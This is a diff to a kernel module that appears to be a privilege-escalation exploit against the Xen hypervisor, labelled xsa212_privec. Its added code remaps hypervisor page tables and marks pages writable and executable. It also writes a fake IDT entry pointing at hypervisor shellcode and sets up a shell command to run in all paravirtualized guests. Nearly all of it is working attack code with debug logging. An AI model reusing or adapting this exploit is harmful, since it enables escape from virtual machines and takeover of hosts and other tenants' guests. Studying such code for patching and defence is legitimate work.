@@ -20,6 +20,14 @@ module_param(user_shellcmd_addr, ulong, 0444);
 MODULE_PARM_DESC(user_shellcmd_addr, "Address of the shell command in userspace");
 
 #define slow_print(...) ({pr_emerg(__VA_ARGS__); schedule_timeout_uninterruptible(2);})
+                                                                                                    
+#define HLOG(_str,_a...)\
+    sprintf(str_buf,"xsa212_privec-%d:" _str "\n", __LINE__, ## _a); \
+    HYPERVISOR_console_io(CONSOLEIO_write,strlen(str_buf),str_buf); 
+
+#define logvar(_v,_f,_a...) \
+        slow_print(#_v "\t" _f "\n",_v); 
+
 
 unsigned long call_int_85(void);
 void backstop_85_handler(void);
@@ -70,7 +78,10 @@ void page_walk(unsigned long va)
         return;
     }
 
+    //slow_print("Will get the pgd\n");
 	pud = pud_offset(pgd, va);
+    //slow_print("done\n");
+	//slow_print("PUD (%p )" , pud);
     if (pud_none(*pud)){
         printk("pud none!\n");
         return;
@@ -79,6 +90,8 @@ void page_walk(unsigned long va)
         printk("pud bad!\n");
         return;
     }
+    //slow_print("PUD valid!");
+	//printk("val = 0x%lx\n", *(unsigned long*) pud );
 	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
 
 	pmd = pmd_offset(pud, va);
@@ -98,7 +111,61 @@ void page_walk(unsigned long va)
     }
 	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
 }
+void page_walk_nobad(unsigned long va)
+{
+	pgd_t *pgd;
+	pud_t *pud;
+	pmd_t *pmd;
+	pte_t *pte;
+	struct mm_struct *mm = current->mm;
 
+
+
+    printk("Page Walk for va %p\n", (void *) va);
+
+	pgd = pgd_offset(mm, va);
+    if (pgd_none(*pgd)){
+        printk("pgd none!\n");
+        return;
+    }
+	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
+
+	pud = pud_offset(pgd, va);
+    if (pud_none(*pud)){
+        printk("pud none!\n");
+        return;
+    }
+	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
+
+	pmd = pmd_offset(pud, va);
+    if (pmd_none(*pmd)){
+        printk("pmd none!\n");
+        return;
+    }
+	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
+	pte = pte_offset_kernel(pmd, va);
+    if (!pte){
+        printk("PTE not present!\n");
+        return;
+    }
+	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
+}
+
+
+void add_rwx(unsigned long va){
+    unsigned long pa, new_value;
+    pa = __machine_addr((void*) va);
+    new_value = (( *(unsigned long *) va ) | (_PAGE_RW | _PAGE_ACCESSED | _PAGE_DIRTY)) & ~_PAGE_NX;
+    slow_print("Add RWX for addresses: va %p - pa 0x%lx - new value 0x%lx\n",(void *) va, pa, new_value);
+    HYPERVISOR_arbitrary_access(pa,&new_value, sizeof(new_value), ARBITRARY_WRITE);
+}
+
+void add_rwx_linear(unsigned long va){
+    unsigned long new_value;
+    new_value = (( *(unsigned long *) va ) | (_PAGE_RW | _PAGE_ACCESSED | _PAGE_DIRTY)) & ~_PAGE_NX;
+    slow_print("Add RWX (in XEN linear space) for addresses: va %p - pa 0x%lx - new value 0x%lx\n",(void *) va, *(unsigned long *) va, new_value);
+    HYPERVISOR_arbitrary_access(*(unsigned long *) va, &new_value, sizeof(new_value), ARBITRARY_WRITE_LINEAR);
+}
 
 
 unsigned long read_idt_addr(void) {
@@ -286,13 +353,24 @@ static int set_pud_entry(pud_t *pud, u64 pmd_phys_addr) {
  * Used for reading stuff from pagetables owned by the hypervisor.
  */
 static u64 read_phys_value(u64 paddr, u64 **scratch_pt_entry, u8 **scratch_vaddr) {
+
   u8 *vaddr;
+  unsigned long hc_entry_val;
+  slow_print("reading_phys_value 0x%llx, scratch_pt_entry (u64) %p, scratch_vaddr (u8) %p\n", paddr, *scratch_pt_entry, *scratch_vaddr);
   if (paddr & 0x7) {
     slow_print("!!! MISALIGNED PADDR in read_phys_value() !!!\n");
   }
   **scratch_pt_entry = (0x7 | (paddr & ~0xfffUL));
+  hc_entry_val = (0x7 | (paddr & ~0xfffUL));
+  logvar(**scratch_pt_entry, " 0x%llx = (0x7 | (paddr & ~0xfffUL))");
+  HLOG("**scratch_pt_entry 0x%lx = (0x7 | (paddr & ~0xfffUL))", hc_entry_val);
+
   barrier();
   vaddr = ((u8*)*scratch_vaddr) + (paddr & 0xfffUL);
+  //page_walk((unsigned long) (u64*) vaddr);
+  slow_print("va %p has pa 0x%llx\n", (void*) *scratch_vaddr, *(u64*) *scratch_vaddr);
+  //HYPERVISOR_arbitrary_access((unsigned long) *scratch_vaddr , &hc_entry_val, sizeof(unsigned long), ARBITRARY_WRITE_LINEAR);
+  slow_print("va %p has pa 0x%llx\n", (void*) *scratch_vaddr, *(u64*) *scratch_vaddr);
   (*scratch_pt_entry)++;
   (*scratch_vaddr) += 0x1000;
   return *(u64*)vaddr;
@@ -304,41 +382,64 @@ static void *remap_hypervisor_address(u64 vaddr, u64 **scratch_pt_entry, u8 **sc
   u64 pud_entry, pmd_entry, pte_entry;
   u64 *page_virt_addr;
   u64 paddr_to_remap;
+  unsigned long pgd_val_va;
+  unsigned long hc_entry_val;
 
+  slow_print("remap_hypervisor_address : vaddr 0x%llx",vaddr);
   if (vaddr >= 0xffff830000000000 && vaddr <= 0xffff87ffffffffff) {
-    // trick question, we already know the physical address
+    slow_print("// trick question, we already know the physical address\n");
     paddr_to_remap = vaddr - 0xffff830000000000;
   } else {
-    // find PUD phys addr
-    pud_phys_addr = ((unsigned long)pgd_val(*pgd_offset(current->mm, vaddr)) & PTE_PFN_MASK) + 8*pud_index(vaddr);
+    slow_print("// find PUD phys addr\n");
+    pgd_val_va = (unsigned long) pgd_val(*pgd_offset(current->mm, vaddr));
+    logvar(pgd_val_va, "0x%lx = (unsigned long) pgd_val(*pgd_offset(current->mm, vaddr)");
+    pud_phys_addr = ((pgd_val_va) & PTE_PFN_MASK) + 8*pud_index(vaddr);
+    logvar(pud_phys_addr, "0x%llx  pgd_val(*pgd_offset(current->mm, vaddr)) & PTE_PFN_MASK) + 8*pud_index(vaddr)");
 
     pud_entry = read_phys_value(pud_phys_addr, scratch_pt_entry, scratch_vaddr);
+    logvar(pud_entry, "0x%llx  read_phys_value(pud_phys_addr, scratch_pt_entry, scratch_vaddr);");
     if (pud_entry & 0x80) {
       // 1GB hugepage
       slow_print("  1GB hugepage\n");
       paddr_to_remap = (pud_entry & PHYSICAL_PUD_PAGE_MASK_) | (vaddr & ~PUD_PAGE_MASK);
+      logvar(paddr_to_remap, "0x%llx = (pud_entry & PHYSICAL_PUD_PAGE_MASK_) | (vaddr & ~PUD_PAGE_MASK);");
     } else {
       // find PMD phys addr, map PMD
       slow_print("  not a 1GB hugepage, basic flags 0x%llx\n", pud_entry & 0x7);
       pmd_phys_addr = ((pud_entry & PTE_PFN_MASK) + 8*pmd_index(vaddr));
+      logvar(pmd_phys_addr, "0x%llx = ((pud_entry & PTE_PFN_MASK) + 8*pmd_index(vaddr));");
       pmd_entry = read_phys_value(pmd_phys_addr, scratch_pt_entry, scratch_vaddr);
+      logvar(pmd_entry, "0x%llx = read_phys_value(pmd_phys_addr, scratch_pt_entry, scratch_vaddr);");
       if (pmd_entry & 0x80) {
         // 2MB hugepage
         slow_print("  2MB hugepage\n");
         paddr_to_remap = (pud_entry & PHYSICAL_PMD_PAGE_MASK_) | (vaddr & ~PMD_PAGE_MASK);
+        logvar(paddr_to_remap, "0x%llx = (pud_entry & PHYSICAL_PMD_PAGE_MASK_) | (vaddr & ~PMD_PAGE_MASK);");
       } else {
         // find PTE phys addr, map PTE
         slow_print("  not a 2MB hugepage, basic flags 0x%llx\n", pmd_entry & 0x7);
         pte_phys_addr = ((pmd_entry & PTE_PFN_MASK) + 8*pte_index(vaddr));
+        logvar(pte_phys_addr, "0x%llx  = ((pmd_entry & PTE_PFN_MASK) + 8*pte_index(vaddr));");
         pte_entry = read_phys_value(pte_phys_addr, scratch_pt_entry, scratch_vaddr);
+        logvar(pte_entry, "0x%llx = read_phys_value(pte_phys_addr, scratch_pt_entry, scratch_vaddr);");
         paddr_to_remap = ((pte_entry & PTE_PFN_MASK) | (vaddr & 0xfffUL));
+        logvar(paddr_to_remap, "0x%llx = ((pte_entry & PTE_PFN_MASK) | (vaddr & 0xfffUL));");
       }
     }
   }
 
   // remap page
-  
+  slow_print("  remapping paddr 0x%llx to vaddr %p - 0x%lx\n", (paddr_to_remap & ~0xfffUL), *scratch_pt_entry, __machine_addr(*scratch_pt_entry));
+  **scratch_pt_entry = (0x7 | (paddr_to_remap & ~0xfffUL));
+  hc_entry_val = (0x7 | (paddr_to_remap & ~0xfffUL));
+  barrier();
+  page_virt_addr = (void*)*scratch_vaddr;
+  logvar(page_virt_addr, "%p ");
+  HLOG("**scratch_vaddr 0x%llx = (0x7 | (paddr & ~0xfffUL))",**scratch_pt_entry);
+  //HYPERVISOR_arbitrary_access((unsigned long) page_virt_addr, &hc_entry_val, sizeof(unsigned long), ARBITRARY_WRITE_LINEAR);
+  (*scratch_pt_entry)++;
   (*scratch_vaddr) += 0x1000;
+  slow_print("value to return is : %p\n", (void*)( ((u64)page_virt_addr) | (paddr_to_remap & 0xfffUL) ));
 
   return (void*)( ((u64)page_virt_addr) | (paddr_to_remap & 0xfffUL) );
 }
@@ -375,6 +476,7 @@ static struct idt_entry *idt_85_remapped_addrs[MAX_PHYS_CORES];
  *   mapped by us: 0xffff82d0c0000000 - 0xffff82d0ffffffff (inaccessible from guest ctx by default)
  */
 #define MY_SECOND_AREA 0xffff804000000000ULL
+//#define MY_SECOND_AREA 0x0000600080000000
 #define MY_THIRD_AREA  0xffff82d0c0000000ULL
 #define HV_SHELLCODE_ADDR (MY_THIRD_AREA + 0x1000)
 
@@ -390,7 +492,10 @@ static void maybe_set_cur_physcpu_idt_entry(u64 **scratch_pt_entry, u8 **scratch
       u64 int80_vaddr = cur_idt_addr + 16 * 0x80;
       struct idt_entry *int80_entry = remap_hypervisor_address(int80_vaddr, scratch_pt_entry, scratch_vaddr);
       struct idt_entry *int85_entry = int80_entry + 5;
-      struct idt_entry new_entry;
+      struct idt_entry new_entry, tmp_entry;
+      
+      //logvar(int80_vaddr, "0x%llx cur_idt_addr + 16 * 0x80;");
+      // pau!!! page_walk((unsigned long) int80_entry);
 
       slow_print("IDT entry for 0x80 should be at 0x%llx\n", int80_vaddr);
       slow_print("remapped IDT entry for 0x80 to 0x%p\n", int80_entry);
@@ -407,14 +512,25 @@ static void maybe_set_cur_physcpu_idt_entry(u64 **scratch_pt_entry, u8 **scratch
         slow_print("blargh, IDT entry 0x80 is weird\n");
         return;
       }
+      slow_print("physical pages : int80_entry 0x%lx  | int85_entry 0x%lx ", int80_entry, *int85_entry);
+      slow_print("Assigning the new_entry to int80_entry %p -> %p \n",&new_entry, (void *)int80_entry);
       new_entry = *int80_entry;
+      slow_print("setting the offset_1\n");
       new_entry.offset_1 = (HV_SHELLCODE_ADDR & 0xffff);
+      slow_print("setting the offset_2\n");
       new_entry.offset_2 = (HV_SHELLCODE_ADDR & 0xffff0000) >> 16;
+      slow_print("setting the offset_3\n");
       new_entry.offset_3 = HV_SHELLCODE_ADDR >> 32;
-      *int85_entry = new_entry;
-
+      slow_print("Assigning the int85_entry  the new_entry %p -> %p \n", (void*) int85_entry, &new_entry);
+      //page_walk((unsigned long) int85_entry);
+      //*((struct idt_entry*) *(u64*) int85_entry) = new_entry;
+      //*int85_entry = new_entry;
+      HYPERVISOR_arbitrary_access((unsigned long) int85_entry, &new_entry , sizeof(struct idt_entry),ARBITRARY_WRITE_LINEAR);
+      slow_print("idt_addrs[1] curt_idt\n");
       idt_addrs[i] = cur_idt_addr;
+      slow_print("idt_85 remapped \n");
       idt_85_remapped_addrs[i] = int85_entry;
+      slow_print("Done!\n");
       return;
     }
   }
@@ -459,12 +575,10 @@ void mem_test(void)
     }
 }
 
-
 static void cleanup_test(void) {
   u64 *scratch_pt_entry;
   u8 *scratch_vaddr;
   unsigned long new_value;
-  pgd_t *m2a_pgd;
   
   pgd_t *user_pgd = pgd_offset(current->mm, 0x0000600040000000);
   pud_t *user_pud = pud_offset(user_pgd, 0x0000600040000000);
@@ -490,9 +604,9 @@ static void cleanup_test(void) {
 
   /* misc debug output */
   slow_print("PML4 at %p\n", current->mm->pgd);
-  page_walk((unsigned long) current->mm->pgd);
   slow_print("Page Walk of MY_SECOND_AREA\n");
-  page_walk(MY_SECOND_AREA);
+  /* crashes in the 4.6.0 and 4.8.0, the PGD is ok, but the PUD page could not be loaded */
+  //page_walk(MY_SECOND_AREA);
   slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
   //m2a_pgd = pgd_offset(current->mm, MY_SECOND_AREA);
   //slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*m2a_pgd));
@@ -502,35 +616,46 @@ static void cleanup_test(void) {
   //new_value = (( *(unsigned long *) m2a_pgd ) | (_PAGE_RW)) & ~_PAGE_NX;
   //slow_print("m2a_pgd value = 0x%lx\n",new_value);
   //HYPERVISOR_arbitrary_access(__machine_addr(m2a_pgd),&new_value, sizeof(new_value), ARBITRARY_WRITE);
-  page_walk(MY_SECOND_AREA);
-  slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
+  add_rwx((unsigned long) pgd_offset(current->mm, MY_SECOND_AREA));
+  //page_walk(MY_SECOND_AREA);
+  //slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
   slow_print("PML4 THIRD entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_THIRD_AREA)));
   slow_print("PML4 entry for my_pt: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, (unsigned long) my_pt)));
 
 
   /* link my_pt in my_pmd */
   my_pmd[0] = (0x7 | virt_to_machine(my_pt).maddr);
+  logvar(my_pmd[0],"0x%llx - my_pt.maddr");
   slow_print("page walk of my_pt\n");
   page_walk((unsigned long) my_pt);
   slow_print("page walk of my_pmd\n");
   page_walk((unsigned long) my_pmd);
 
 
+  slow_print("0x%lx  = ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_SECOND_AREA)).pgdi\n",((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_SECOND_AREA)).pgd));
   /* map target PUD as entry 0, for writing from the guest */
   my_pt[0] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_SECOND_AREA)).pgd & PTE_PFN_MASK));
+  logvar(my_pt[0],"0x%llx - *pgd_offset(current->mm, MY_SECOND_AREA)).pgd & PTE_PFN_MASK");
+  
   /* map HV shellcode page as entry 1, for RWX access from ring 0 (W for inline BSS) */
   my_pt[1] = (0x3 | virt_to_machine(hv_shellcode_page).maddr);
+  logvar(my_pt[1],"0x%llx - hv_shellcode_page.maddr");
   /* map 64bit guest shellcode page as entry 2, for RX access from ring 3 */
   my_pt[2] = (0x5 | virt_to_machine(user_shellcode_page).maddr);
+  logvar(my_pt[2],"0x%llx - user_shellcode_page.maddr");
   /* map our userspace PUD as entry 3, for writing from the guest, so we can
    * cleanly undo the initial PUD mapping */
   my_pt[3] = (0x7 | (virt_to_machine(user_pud).maddr & ~0xfffUL));
+  logvar(my_pt[3],"0x%llx - user_pud).maddr )");
   /* map kernel PML4 as entry 4, for writing from the guest (to grant guest access to PML4:261) */
   my_pt[4] = (0x7 | virt_to_machine(current->mm->pgd).maddr);
+  logvar(my_pt[4],"0x%llx - mm->pgd.maddr");
   /* map target PUD for MY_THIRD_AREA as entry 5, for writing from the guest */
   my_pt[5] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_THIRD_AREA)).pgd & PTE_PFN_MASK));
+  logvar(my_pt[5],"0x%llx - (*pgd_offset(current->mm, MY_THIRD_AREA)).pgd & PTE_PFN_MASK");
   /* shell command to run in all PV guests */
   my_pt[6] = (0x5 | virt_to_machine(shell_command_page).maddr);
+  logvar(my_pt[6],"0x%llx - shell_command_page.maddr");
 
   /* *
    * A sign that the bug is not in the bug emulation is the inability to 
@@ -538,8 +663,8 @@ static void cleanup_test(void) {
    */
 
   /* set up temporary mapping through a guest userspace address */
-  slow_print("Printing the mapping before  0x0000600040000000");
-  page_walk(0x0000600040000000);
+  //slow_print("Printing the mapping before  0x0000600040000000");
+  //page_walk(0x0000600040000000);
   set_pud_entry(user_pud, virt_to_machine(my_pmd).maddr);
   slow_print("Printing the mapping after 0x0000600040000000\n");
   page_walk(0x0000600040000000);
@@ -548,9 +673,18 @@ static void cleanup_test(void) {
   /* put a reference to our PMD into the target PUD */
   slow_print("dummy\n");
   slow_print("going to link PMD into target PUD\n");
-  slow_print("PMD addres %llx (plus flags %llx)\n", virt_to_machine(my_pmd).maddr,(0x7 | virt_to_machine(my_pmd).maddr));
+  slow_print("((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] =  %llx\n", ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] );
+  slow_print("PMD addres 0x%llx\n", (0x7 | virt_to_machine(my_pmd).maddr));
   ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
   slow_print(" ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] =  %llx\n", ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] );
+  //new_value = 8;
+  //HYPERVISOR_arbitrary_access(MY_SECOND_AREA + 0x3000, &new_value, sizeof(new_value), ARBITRARY_WRITE_LINEAR);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000)): %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000)));
+  slow_print("_pa ((u64*)(MY_SECOND_AREA+0x3000)): %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000)));
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[0]: %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[0]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[1] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[1]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[2] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[2]);
+  //return;
 
   barrier();
   slow_print("linked PMD into target PUD\n");
@@ -560,30 +694,46 @@ static void cleanup_test(void) {
   slow_print("going to unlink mapping via userspace PUD\n");
   //slow_print("forcing quit");
   slow_print("((u64*)(MY_SECOND_AREA+0x3000)) : %p\n",((u64*)(MY_SECOND_AREA+0x3000)));
+  //page_walk((unsigned long) ((u64*)(MY_SECOND_AREA+0x3000)));
+  //add_rwx((unsigned long) pgd_offset(current->mm, MY_SECOND_AREA+0x3000));
+  new_value = 0;
+  HYPERVISOR_arbitrary_access(MY_SECOND_AREA + 0x3000 + 1 * sizeof(unsigned long), &new_value, sizeof(new_value), ARBITRARY_WRITE_LINEAR);
+  HYPERVISOR_arbitrary_access(MY_SECOND_AREA + 0x3000 + 2 * sizeof(unsigned long), &new_value, sizeof(new_value), ARBITRARY_WRITE_LINEAR);
+  //page_walk((unsigned long) ((u64*)(MY_SECOND_AREA+0x3000)));
+  //return;
+  //
+  /*
   slow_print("pa ((u64*)(MY_SECOND_AREA+0x3000)) : 0x%lx\n",__machine_addr(((u64*)(MY_SECOND_AREA+0x3000))));
-  return;
   slow_print("((u64*)(MY_SECOND_AREA+0x3000))[1] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[1]);
   slow_print("((u64*)(MY_SECOND_AREA+0x3000))[2] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[2]);
   slow_print("pa ((u64*)(MY_SECOND_AREA+0x3000))[1] : 0x%lx\n",__machine_addr((void *)((u64*)(MY_SECOND_AREA+0x3000))[1]));
   slow_print("pa ((u64*)(MY_SECOND_AREA+0x3000))[2] : 0x%lx\n",__machine_addr((void *)((u64*)(MY_SECOND_AREA+0x3000))[2]));
-  page_walk((unsigned long) ((u64*)(MY_SECOND_AREA+0x3000))[1]);
   return;
-  ((u64*)(MY_SECOND_AREA+0x3000))[1] = 0;
-  ((u64*)(MY_SECOND_AREA+0x3000))[2] = 0;
+  */
+  //((u64*)(MY_SECOND_AREA+0x3000))[1] = 0;
+  //((u64*)(MY_SECOND_AREA+0x3000))[2] = 0;
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[0] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[0]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[1] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[1]);
+  slow_print("((u64*)(MY_SECOND_AREA+0x3000))[2] : %p\n",(void *)((u64*)(MY_SECOND_AREA+0x3000))[2]);
   slow_print("mapping unlink done\n");
   barrier();
-  
-  return;
 
-  /* we have 256 pt entries reserved for scratch allocs */
+  slow_print("/* we have 256 pt entries reserved for scratch allocs */\n");
+
   scratch_pt_entry = my_pt + 256;
+  logvar(scratch_pt_entry, " %p my_pt + 256");
   scratch_vaddr = (void*)(MY_SECOND_AREA + 256 * 0x1000UL);
+  logvar(scratch_vaddr, " %p (void*)(MY_SECOND_AREA + 256 * 0x1000UL");
 
-  /* also map into MY_THIRD_AREA */
-  ((u64*)(MY_SECOND_AREA + 0x5000))[pud_index(MY_THIRD_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
+  slow_print("/* also map into MY_THIRD_AREA */\n");
+  //((u64*)(MY_SECOND_AREA + 0x5000))[pud_index(MY_THIRD_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
+  new_value = (0x7 | virt_to_machine(my_pmd).maddr);
+  slow_print("%p = 0x%lx \n", (void*) (MY_SECOND_AREA + 0x5000 +  pud_index(MY_THIRD_AREA)* sizeof(unsigned long)), new_value);
+  HYPERVISOR_arbitrary_access(MY_SECOND_AREA + 0x5000 +  pud_index(MY_THIRD_AREA)* sizeof(unsigned long), &new_value, sizeof(new_value), ARBITRARY_WRITE_LINEAR);
   barrier();
 
-  /* prepare shellcode pages */
+  slow_print("/* prepare shellcode pages */\n");
+
   if (sizeof(hv_shellcode) > 0x1000 || sizeof(user_shellcode) > 0x1000) {
     slow_print("!!! HV/user shellcode too big !!!\n");
     return;
